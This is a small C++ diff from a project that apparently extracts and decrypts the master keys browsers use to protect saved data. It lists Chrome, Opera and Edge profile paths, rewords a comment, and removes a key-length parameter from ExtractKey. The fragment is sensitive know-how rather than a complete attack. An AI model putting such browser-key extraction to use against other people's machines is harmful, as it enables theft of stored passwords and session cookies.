@@ -31,7 +31,7 @@
 //};
 
 
-const std::vector<std::string> Browser::relativePaths = {			// Relative Path to browser(s) data
+const std::vector<std::string> Browser::relativePaths = {			// Parent directory of browser(s)
 	"/AppData/Local/Google/Chrome/User Data/",
 	"/AppData/Roaming/Opera Software/",
 	"/AppData/Local/Microsoft/Edge/User Data/",
@@ -143,14 +143,10 @@ std::string Browser::decryptMasterKey(const std::string& encryptedKey) {
 
 /*				========================= Public functions =========================				*/
 
-void Browser::ExtractKey(const std::string& browserPath, const unsigned int& b64_key_length) {
+void Browser::ExtractKey(const std::string& browserPath) {
 
 	// Check whether the browser EXIST or NOT
 	if (browserPath.empty()) {
-		return;
-	}
-	if (b64_key_length == 0) {
-		std::cout << BrowserName << "Base64 key length cannot be 0" << std::endl;
 		return;
 	}
 	if (BrowserName.empty()) {
